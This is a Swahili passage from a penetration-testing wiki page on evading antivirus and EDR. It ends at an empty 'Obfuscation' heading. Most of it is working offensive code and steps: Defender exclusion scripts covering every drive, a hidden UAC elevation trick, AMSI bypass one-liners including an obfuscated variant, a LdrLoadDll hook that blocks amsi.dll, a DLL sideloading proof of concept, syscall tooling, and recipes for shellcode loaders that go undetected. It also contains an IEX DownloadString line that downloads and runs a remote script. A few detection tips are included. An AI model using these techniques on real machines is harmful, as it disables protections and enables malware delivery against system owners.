# Kukomesha Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Ukurasa huu uliandikwa awali na** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Simamisha Defender

- [defendnot](https://github.com/es3n1n/defendnot): Zana ya kuzuia Windows Defender kufanya kazi.
- [no-defender](https://github.com/es3n1n/no-defender): Zana ya kuzuia Windows Defender kufanya kazi kwa kujifanya antivirus nyingine.
- [Zima Defender ikiwa wewe ni admin](basic-powershell-for-pentesters/README.md)

### Ujanja wa UAC wa mtindo wa kisakinishi kabla ya kuchezea Defender

Loaders za umma zinazojifanya cheats za michezo mara nyingi huja kama visakinishi vya Node.js/Nexe visivyosainiwa, ambavyo kwanza **humwomba mtumiaji ruhusa za juu** ndipo vinadhoofisha Defender. Mchakato wake ni rahisi:

1. Kagua ikiwa mtumiaji ana ruhusa za kiutawala kwa kutumia `net session`. Amri hii hufaulu tu ikiwa mtumiaji ana ruhusa za admin, kwa hivyo ikishindwa inaashiria kuwa loader inaendeshwa na mtumiaji wa kawaida.
2. Iwashe upya mara moja kwa kutumia kitenzi cha `RunAs` ili kuonyesha kidokezo cha kawaida cha idhini ya UAC huku ikihifadhi mstari wa amri wa awali.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Waathiriwa tayari wanaamini kuwa wanasakinisha programu “iliyopasuliwa”, kwa hiyo kwa kawaida wanakubali kidokezo hicho, na hivyo kuipa malware ruhusa inayohitaji kubadilisha sera ya Defender.<sup>[[26]](#references)</sup>

### Vighairi vya `MpPreference` vinavyohusu kila herufi ya kiendeshi

Baada ya kupata ruhusa za juu, minyororo ya aina ya GachiLoader huongeza maeneo ambayo Defender haiwezi kuchunguza badala ya kuzima huduma kabisa. Loader huua kwanza programu ya GUI inayofuatilia afya (`taskkill /F /IM SecHealthUI.exe`) kisha huongeza **vighairi vipana mno** ili kila wasifu wa mtumiaji, saraka ya mfumo na diski inayoweza kutolewa isiweze kuchunguzwa:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Mambo muhimu ya kuzingatia:

- Kitanzi hupitia kila mfumo wa faili uliowekwa (D:\, E:\, vijiti vya USB, n.k.), kwa hivyo **payload yoyote ya baadaye itakayowekwa popote kwenye diski itapuuzwa**.
- Kutojumuisha kiendelezi cha `.sys` ni hatua ya baadaye—washambuliaji wanahifadhi chaguo la kupakia drivers ambazo hazijasainiwa baadaye bila kugusa Defender tena.
- Mabadiliko yote hufanywa chini ya `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, hivyo hatua za baadaye zinaweza kuthibitisha kuwa exclusions zimedumu au kuzipanua bila kuanzisha UAC tena.

Kwa kuwa hakuna huduma ya Defender inayosimamishwa, ukaguzi rahisi wa afya bado huripoti “antivirus active” ingawa ukaguzi wa wakati halisi haukagui njia hizo.<sup>[[26]](#references)</sup>

## **Mbinu za Kukwepa AV**

Kwa sasa, AV hutumia mbinu tofauti kubaini kama faili ni hasidi au la: utambuzi tuli, uchanganuzi wa nguvu, na kwa EDR za hali ya juu zaidi, uchanganuzi wa tabia.

### **Utambuzi tuli**

Utambuzi tuli hufanywa kwa kutambua mifuatano hasidi inayojulikana au safu za bytes ndani ya binary au script, na pia kutoa taarifa kutoka kwenye faili lenyewe (k.m. maelezo ya faili, jina la kampuni, sahihi za kidijitali, ikoni, checksum, n.k.). Hii inamaanisha kuwa kutumia zana za umma zinazojulikana kunaweza kukufanya ugunduliwe kwa urahisi zaidi, kwa kuwa huenda tayari zimechanganuliwa na kutambuliwa kuwa hasidi. Kuna mbinu kadhaa za kukwepa aina hii ya utambuzi:

- **Usimbaji fiche**

Ukisimba binary kwa fiche, AV haitaweza kugundua programu yako, lakini utahitaji aina fulani ya loader ili kufungua usimbaji fiche na kuendesha programu kwenye memory.

- **Kuficha maudhui**

Wakati mwingine unachohitaji ni kubadilisha baadhi ya mifuatano kwenye binary au script yako ili ipite AV, lakini kazi hii inaweza kuchukua muda kutegemea unachojaribu kuficha.

- **Kutengeneza zana maalum**

Ukitengeneza zana zako mwenyewe, hakutakuwa na signatures hasidi zinazojulikana, lakini kufanya hivyo kunahitaji muda na juhudi nyingi.

> [!TIP]
> Njia nzuri ya kukagua utambuzi tuli wa Windows Defender ni kutumia [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Hugawa faili katika sehemu nyingi kisha huagiza Defender ichanganue kila sehemu kivyake. Kwa njia hii, inaweza kukuonyesha hasa mifuatano au bytes zilizotambuliwa ndani ya binary yako.

Ninapendekeza sana utazame [orodha hii ya video za YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) kuhusu mbinu za vitendo za kukwepa AV.

### **Uchanganuzi wa nguvu**

Uchanganuzi wa nguvu ni pale AV inapoendesha binary yako kwenye sandbox na kufuatilia shughuli hasidi (k.m. kujaribu kufungua usimbaji fiche na kusoma nywila za browser yako, kufanya minidump ya LSASS, n.k.). Sehemu hii inaweza kuwa ngumu zaidi kushughulikia, lakini hapa kuna mambo unayoweza kufanya ili kukwepa sandbox.

- **Kusubiri kabla ya kutekeleza** Kulingana na jinsi mbinu hii ilivyotekelezwa, inaweza kuwa njia nzuri ya kukwepa uchanganuzi wa nguvu wa AV. AV huwa na muda mfupi sana wa kuchanganua faili ili isikatize utendaji wa mtumiaji, kwa hivyo kusubiri kwa muda mrefu kunaweza kuvuruga uchanganuzi wa binaries. Tatizo ni kwamba sandbox nyingi za AV zinaweza kuruka muda wa kusubiri, kutegemea jinsi ulivyotekelezwa.
- **Kukagua rasilimali za mashine** Kwa kawaida sandbox huwa na rasilimali chache sana za kutumia (k.m. RAM chini ya 2GB), la sivyo zinaweza kupunguza kasi ya mashine ya mtumiaji. Unaweza pia kutumia ubunifu mkubwa hapa, kwa mfano kwa kukagua halijoto ya CPU au hata kasi ya feni; si kila kitu kitatekelezwa kwenye sandbox.
- **Ukaguzi maalum kwa mashine** Ikiwa unataka kulenga mtumiaji ambaye workstation yake imeunganishwa kwenye domain ya "contoso.local", unaweza kukagua domain ya kompyuta ili kuona kama inalingana na uliyoainisha. Isipolingana, unaweza kuifanya programu yako ijifunge.

Imebainika kuwa jina la kompyuta la sandbox ya Microsoft Defender ni HAL9TH. Kwa hivyo, unaweza kukagua jina la kompyuta kwenye malware yako kabla haijalipuka. Jina likiwa HAL9TH, hiyo inamaanisha uko ndani ya sandbox ya Defender, kwa hivyo unaweza kuifanya programu yako ijifunge.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>chanzo: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Vidokezo vingine vizuri sana kutoka kwa [@mgeeky](https://twitter.com/mariuszbit) vya kukwepa sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> chaneli ya #malware-dev</p></figcaption></figure>

Kama tulivyosema awali kwenye chapisho hili, **zana za umma** hatimaye **zitagunduliwa**, kwa hivyo jiulize:

Kwa mfano, ikiwa unataka kutoa dump ya LSASS, **unahitaji kweli kutumia mimikatz**? Au unaweza kutumia mradi tofauti usiojulikana sana ambao pia hutoa dump ya LSASS?

Jibu sahihi huenda likawa la pili. Tukichukulia mimikatz kama mfano, huenda ni mojawapo ya malware zinazotambuliwa zaidi na AV na EDR, kama siyo inayotambuliwa zaidi. Ingawa mradi wenyewe ni mzuri sana, ni vigumu mno kuutumia na kukwepa AV. Kwa hiyo, tafuta tu njia mbadala za kutimiza unachojaribu kufanya.

> [!TIP]
> Unaporekebisha payloads zako ili kukwepa utambuzi, hakikisha **umezima uwasilishaji wa sampuli kiotomatiki** kwenye Defender, na tafadhali, kwa dhati kabisa, **USIPAKIE KWENYE VIRUSTOTAL** ikiwa lengo lako ni kukwepa utambuzi kwa muda mrefu. Ikiwa unataka kuangalia kama AV fulani inatambua payload yako, isakinishe kwenye VM, jaribu kuzima uwasilishaji wa sampuli kiotomatiki, kisha ijaribu humo hadi uridhike na matokeo.

## EXEs dhidi ya DLLs

Inapowezekana, **weka kipaumbele kwa kutumia DLLs ili kukwepa utambuzi**. Kwa uzoefu wangu, faili za DLL kwa kawaida **hugunduliwa na kuchanganuliwa mara chache zaidi**, kwa hivyo hii ni mbinu rahisi sana ya kutumia ili kuepuka utambuzi katika baadhi ya hali (ikiwa payload yako inaweza kuendeshwa kama DLL, bila shaka).

Kama tunavyoona kwenye picha hii, DLL Payload kutoka Havoc ina kiwango cha utambuzi cha 4/26 kwenye antiscan.me, huku payload ya EXE ikiwa na kiwango cha utambuzi cha 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>Ulinganisho wa antiscan.me kati ya payload ya kawaida ya Havoc EXE na DLL ya kawaida ya Havoc</p></figcaption></figure>

Sasa tutaonyesha mbinu kadhaa unazoweza kutumia na faili za DLL ili kupunguza zaidi uwezekano wa kugunduliwa.

## DLL Sideloading & Proxying

**DLL Sideloading** hutumia mpangilio wa utafutaji wa DLL unaotumiwa na loader, kwa kuweka programu lengwa na payload(s) hasidi pamoja.

Unaweza kutafuta programu zinazoweza kuathiriwa na DLL Sideloading ukitumia [Siofra](https://github.com/Cybereason/siofra) na script ifuatayo ya powershell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Amri hii itatoa orodha ya programu zilizo hatarini kwa DLL hijacking ndani ya "C:\Program Files\\" pamoja na faili za DLL wanazojaribu kupakia.

Ninapendekeza sana **uchunguze mwenyewe programu zinazoweza kufanyiwa DLL Hijack/Sideload**; mbinu hii ni fiche sana ikifanywa ipasavyo, lakini ukitumia programu za DLL Sideloadable zinazojulikana hadharani, unaweza kugundulika kwa urahisi.

Kuweka tu DLL hasidi yenye jina ambalo programu inatarajia kupakia hakutapakia payload yako, kwa kuwa programu inatarajia kuwepo kwa functions maalum ndani ya DLL hiyo. Ili kurekebisha tatizo hili, tutatumia mbinu nyingine inayoitwa **DLL Proxying/Forwarding**.

**DLL Proxying** huelekeza miito ambayo programu hufanya kupitia DLL ya proxy (na hasidi) kwenda kwa DLL asili, hivyo kuhifadhi utendaji wa programu na kuwezesha kushughulikia utekelezaji wa payload yako.

Nitatumia mradi wa [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) kutoka kwa [@flangvik](https://twitter.com/Flangvik/)

Hizi ndizo hatua nilizofuata:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Amri ya mwisho itatupatia faili 2: kiolezo cha msimbo wa chanzo wa DLL, na DLL ya awali iliyopewa jina jipya.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Hizi ndizo matokeo:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Shellcode yetu (iliyofanywa encoding kwa [SGN](https://github.com/EgeBalci/sgn)) pamoja na proxy DLL zina Detection rate ya 0/26 kwenye [antiscan.me](https://antiscan.me)! Ningesema huo ni mafanikio.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Ninapendekeza sana** utazame [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) kuhusu DLL Sideloading na pia [video ya ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) ili ujifunze zaidi kuhusu tuliyojadili kwa kina zaidi.

### Kutumia Vibaya Forwarded Exports (ForwardSideLoading)

Moduli za Windows PE zinaweza ku-export functions ambazo kwa kweli ni "forwarders": badala ya kuelekeza kwenye code, export entry huwa na string ya ASCII ya muundo `TargetDll.TargetFunc`. Caller inapotatua export hiyo, Windows loader itafanya yafuatayo:

- Itapakia `TargetDll` ikiwa bado haijapakiwa
- Itatatua `TargetFunc` kutoka humo

Tabia muhimu za kuelewa:
- Ikiwa `TargetDll` ni KnownDLL, inatolewa kutoka kwenye namespace ya KnownDLLs iliyolindwa (k.m., ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Ikiwa `TargetDll` si KnownDLL, mpangilio wa kawaida wa utafutaji wa DLL hutumika, ukiwemo directory ya moduli inayofanya forward resolution.

Hii huwezesha primitive ya indirect sideloading: tafuta DLL iliyosainiwa ambayo hu-export function iliyo-forward kwenda kwenye jina la moduli isiyo KnownDLL, kisha iweke DLL hiyo iliyosainiwa kwenye directory moja na DLL inayodhibitiwa na mshambuliaji, yenye jina linalolingana kabisa na moduli lengwa iliyo-forward. Forwarded export inapoombwa, loader hutatua forward hiyo na kupakia DLL yako kutoka kwenye directory hiyo hiyo, na kutekeleza DllMain yako.<sup>[[13]](#references)</sup>

Mfano ulioonekana kwenye Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` si KnownDLL, kwa hiyo hupatikana kwa kutumia mpangilio wa kawaida wa utafutaji.

PoC (nakili-bandika):
1) Nakili DLL ya mfumo iliyosainiwa kwenye folda inayoweza kuandikiwa kuyo
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Weka `NCRYPTPROV.dll` hasidi kwenye folda hiyo hiyo. DllMain ndogo kabisa inatosha kutekeleza msimbo; huhitaji kutekeleza forwarded function ili kuwasha DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Anzisha usambazaji kwa kutumia LOLBin iliyosainiwa:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Tabia iliyozingatiwa:
- rundll32 (iliyotiwa saini) hupakia `keyiso.dll` (iliyotiwa saini) iliyo side-by-side
- Wakati wa kutatua `KeyIsoSetAuditingInterface`, loader hufuata forward kuelekea `NCRYPTPROV.SetAuditingInterface`
- Kisha loader hupakia `NCRYPTPROV.dll` kutoka `C:\test` na kutekeleza `DllMain` yake
- Ikiwa `SetAuditingInterface` haijatekelezwa, utapata hitilafu ya "missing API" baada tu ya `DllMain` tayari kuendeshwa

Vidokezo vya kutafuta:
- Lenga exports zilizo forwarded ambapo moduli lengwa si KnownDLL. KnownDLLs zimeorodheshwa chini ya `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Unaweza kuorodhesha exports zilizo forwarded kwa kutumia zana kama:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Tazama orodha ya Windows 11 forwarder ili kutafuta vinavyoweza kufaa: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Mawazo ya ugunduzi/ulinzi:
- Fuatilia LOLBins (kwa mfano, rundll32.exe) zinapopakia DLL zilizosainiwa kutoka kwenye njia zisizo za mfumo, kisha kupakia non-KnownDLLs zenye jina msingi sawa kutoka kwenye saraka hiyo
- Toa tahadhari kuhusu minyororo ya michakato/moduli kama hii: `rundll32.exe` → `keyiso.dll` isiyo ya mfumo → `NCRYPTPROV.dll` ndani ya njia ambazo watumiaji wanaweza kuandikia
- Tekeleza sera za uadilifu wa msimbo (WDAC/AppLocker) na uzuie write+execute kwenye saraka za programu

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ni kifurushi cha zana za payload cha kukwepa EDRs kwa kutumia michakato iliyosimamishwa, direct syscalls, na mbinu mbadala za utekelezaji`

Unaweza kutumia Freeze kupakia na kutekeleza shellcode yako kwa njia ya siri.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ni mchezo wa paka na panya tu; kinachofanya kazi leo kinaweza kutambuliwa kesho, kwa hivyo usitegemee zana moja pekee. Ikiwezekana, jaribu kuunganisha mbinu nyingi za evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR mara nyingi huweka **user-mode inline hooks** kwenye syscall stubs za `ntdll.dll`. Ili kupita hooks hizo, unaweza kutengeneza **direct** au **indirect** syscall stubs zinazopakia **SSN** (System Service Number) sahihi na kuhamia kernel mode bila kutekeleza hooked export entrypoint.<sup>[[32]](#references)</sup>

**Chaguo za invocation:**
- **Direct (embedded)**: weka maagizo ya `syscall`/`sysenter`/`SVC #0` kwenye stub iliyotengenezwa (hakuna mguso wa `ntdll` export).
- **Indirect**: ruka hadi kwenye `syscall` gadget iliyopo ndani ya `ntdll` ili mpito kwenda kernel uonekane umetoka `ntdll` (inafaa kwa evasion ya heuristic); **randomized indirect** huchagua gadget kutoka kwenye pool kwa kila call.
- **Egg-hunt**: epuka kuweka mfuatano tuli wa opcode `0F 05` kwenye diski; tambua mfuatano wa syscall wakati wa runtime.

**Mikakati ya kutambua SSN inayostahimili hooks:**
- **FreshyCalls (VA sort)**: kadiria SSN kwa kupanga syscall stubs kulingana na virtual address badala ya kusoma stub bytes.
- **SyscallsFromDisk**: mapia `\KnownDlls\ntdll.dll` safi, soma SSN kutoka `.text` yake, kisha iondoe kwenye ramani (hupita hooks zote za ndani ya kumbukumbu).
- **RecycledGate**: changanya ukadiriaji wa SSN kwa kupanga VA na uthibitishaji wa opcode wakati stub iko safi; tumia ukadiriaji wa VA iwapo imewekewa hook.
- **HW Breakpoint**: weka DR0 kwenye maagizo ya `syscall` na utumie VEH kunasa SSN kutoka `EAX` wakati wa runtime, bila kuchanganua bytes zilizowekewa hook.

Mfano wa matumizi ya SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI iliundwa kuzuia "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Hapo awali, AV ziliweza kuchanganua **faili zilizo kwenye diski** pekee, kwa hiyo, ikiwa ungeweza kwa namna fulani kutekeleza payloads **moja kwa moja kwenye kumbukumbu**, AV haingeweza kufanya lolote kuzuia hilo, kwa kuwa haikuwa na mwonekano wa kutosha.

Kipengele cha AMSI kimejumuishwa kwenye vipengele hivi vya Windows.

- User Account Control, au UAC (upandishaji wa EXE, COM, MSI, au usakinishaji wa ActiveX)
- PowerShell (scripts, matumizi shirikishi, na tathmini ya msimbo unaozalishwa kwa nguvu)
- Windows Script Host (wscript.exe na cscript.exe)
- JavaScript na VBScript
- Macros za Office VBA

Kinaruhusu suluhisho za antivirus kukagua tabia ya scripts kwa kufichua maudhui ya scripts katika hali isiyosimbwa kwa njia fiche wala kufichwa.

Kuendesha `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` kutazalisha tahadhari ifuatayo katika Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Angalia jinsi inavyoweka kiambishi awali `amsi:` kisha njia ya executable ambayo script ilitekelezwa kutoka humo, katika hali hii, powershell.exe

Hatukuandika faili yoyote kwenye diski, lakini bado tulinaswa tukiwa kwenye kumbukumbu kutokana na AMSI.

Zaidi ya hayo, kuanzia **.NET 4.8**, msimbo wa C# pia hupitishwa kupitia AMSI. Hili huathiri hata `Assembly.Load(byte[])` inayotumika kupakia utekelezaji ulio kwenye kumbukumbu. Ndiyo maana kutumia matoleo ya chini ya .NET (kama 4.7.2 au ya chini zaidi) kunapendekezwa kwa utekelezaji ulio kwenye kumbukumbu ikiwa unataka kukwepa AMSI.

Kuna njia kadhaa za kukwepa AMSI:

- **Obfuscation**

Kwa kuwa AMSI hufanya kazi hasa kwa kutumia utambuzi tuli, kurekebisha scripts unazojaribu kupakia kunaweza kuwa njia nzuri ya kukwepa utambuzi.

Hata hivyo, AMSI ina uwezo wa kufichua scripts zilizofichwa, hata zikiwa na tabaka nyingi, kwa hiyo obfuscation inaweza kuwa chaguo baya kutegemea jinsi inavyofanywa. Hii inafanya kuikwepa kusiwe rahisi moja kwa moja. Ingawa, wakati mwingine unachohitaji ni kubadilisha majina ya vigezo kadhaa tu na utakuwa sawa, kwa hiyo inategemea ni kwa kiwango gani kitu kimewekewa alama.

- **AMSI Bypass**

Kwa kuwa AMSI hutekelezwa kwa kupakia DLL kwenye mchakato wa powershell (pia cscript.exe, wscript.exe, n.k.), inawezekana kuichezea kwa urahisi hata ukiendesha kama mtumiaji asiye na ruhusa za juu. Kutokana na dosari hii katika utekelezaji wa AMSI, watafiti wamegundua njia nyingi za kukwepa uchanganuzi wa AMSI.

**Kulazimisha Hitilafu**

Kulazimisha uanzishaji wa AMSI ushindwe (amsiInitFailed) kutasababisha uchanganuzi wowote kutoanzishwa kwa mchakato wa sasa. Hili lilifichuliwa awali na [Matt Graeber](https://twitter.com/mattifestation), na Microsoft imetengeneza signature ili kuzuia matumizi mapana zaidi.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Kilichohitajika tu ni mstari mmoja wa code ya powershell ili kuifanya AMSI isiweze kutumika katika mchakato wa sasa wa powershell. Bila shaka, mstari huu umegunduliwa na AMSI yenyewe, kwa hivyo unahitaji kurekebishwa kidogo ili kutumia technique hii.

Huu hapa ni AMSI bypass iliyorekebishwa niliyochukua kutoka kwenye [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Kumbuka kwamba huenda hili likawekewa alama chapisho hili litakapotoka, kwa hiyo hupaswi kuchapisha code ikiwa mpango wako ni kubaki bila kugunduliwa.

**Memory Patching**

Mbinu hii iligunduliwa awali na [@RastaMouse](https://twitter.com/_RastaMouse/) na inahusisha kutafuta anwani ya function ya "AmsiScanBuffer" katika amsi.dll (inayohusika na kuchanganua ingizo lililotolewa na mtumiaji) na kuibatilisha kwa instructions za kurudisha code ya E_INVALIDARG. Kwa njia hii, matokeo ya uchanganuzi halisi yatakuwa 0, ambayo hutafsiriwa kama matokeo safi.

> [!TIP]
> Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) kwa maelezo ya kina zaidi.

Pia kuna mbinu nyingine nyingi zinazotumika kubypass AMSI kwa powershell. Angalia [**ukurasa huu**](basic-powershell-for-pentesters/index.html#amsi-bypass) na [**repo hii**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) ili kujifunza zaidi kuzihusu.

### Kuzuia AMSI kwa kuzuia amsi.dll kupakiwa (LdrLoadDll hook)

AMSI huanzishwa tu baada ya `amsi.dll` kupakiwa katika process ya sasa. Njia thabiti ya kuibypass isiyofungamana na lugha ni kuweka user-mode hook kwenye `ntdll!LdrLoadDll` inayorudisha hitilafu wakati module inayoombwa ni `amsi.dll`. Matokeo yake, AMSI haipakii kamwe na hakuna uchanganuzi unaofanyika kwa process hiyo.<sup>[[23]](#references)</sup>

Muhtasari wa utekelezaji (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Vidokezo
- Hufanya kazi katika PowerShell, WScript/CScript na custom loaders (chochote ambacho kingepakia AMSI).
- Ichanganye na kutuma scripts kupitia stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) ili kuepuka mabaki marefu ya command-line.
- Imeonekana ikitumiwa na loaders zinazoendeshwa kupitia LOLBins (kwa mfano, `regsvr32` ikiita `DllRegisterServer`).

Tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** pia hutengeneza script ya kupita AMSI.
Tool **[https://amsibypass.com/](https://amsibypass.com/)** pia hutengeneza script ya kupita AMSI inayokwepa signature kwa kutumia function zilizobainishwa na mtumiaji na zilizobadilishwa nasibu, variables, character expression, na kubadilisha nasibu herufi kubwa na ndogo za keywords za PowerShell ili kuepuka signature.

**Ondoa signature iliyogunduliwa**

Unaweza kutumia tool kama **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** na **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** ili kuondoa signature ya AMSI kutoka kwenye memory ya process ya sasa. Tool hii huchanganua memory ya process ya sasa kutafuta signature ya AMSI kisha huiandika upya kwa maagizo ya NOP, na hivyo kuiondoa kwenye memory.

**Bidhaa za AV/EDR zinazotumia AMSI**

Unaweza kupata orodha ya bidhaa za AV/EDR zinazotumia AMSI kwenye **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Tumia toleo la 2 la PowerShell**
Ukitumia toleo la 2 la PowerShell, AMSI haitapakiwa, kwa hivyo unaweza kuendesha scripts zako bila kuchanganuliwa na AMSI. Unaweza kufanya hivi:

```bash
powershell.exe -version 2
```

## Kuweka Kumbukumbu za PS

Kuweka kumbukumbu za PowerShell ni kipengele kinachokuwezesha kuweka kumbukumbu za amri zote za PowerShell zinazotekelezwa kwenye mfumo. Hii inaweza kusaidia kwa madhumuni ya ukaguzi na utatuzi wa matatizo, lakini pia inaweza kuwa **tatizo kwa washambuliaji wanaotaka kukwepa kutambuliwa**.

Ili kukwepa uwekaji kumbukumbu wa PowerShell, unaweza kutumia mbinu zifuatazo:

- **Zima PowerShell Transcription na Module Logging**: Unaweza kutumia zana kama [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) kwa madhumuni haya.
- **Tumia PowerShell version 2**: Ukitumia PowerShell version 2, AMSI haitapakiwa, kwa hiyo unaweza kuendesha scripts zako bila kuchanganuliwa na AMSI. Unaweza kufanya hivi: `powershell.exe -version 2`
- **Tumia session ya PowerShell isiyodhibitiwa**: Tumia [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kuendesha PowerShell bila kuwasha `powershell.exe` (mbinu inayotumiwa na `powerpick` ya Cobalt Strike). Hii hukwepa vidhibiti vinavyohusishwa mahususi na mchakato wa `powershell.exe`, lakini haizimi moja kwa moja AMSI, Script Block Logging, au ulinzi mwingine wote wa PowerShell; kiwango cha ulinzi hutegemea runtime na utekelezaji wa host.


## Obfuscation

> [!TIP]
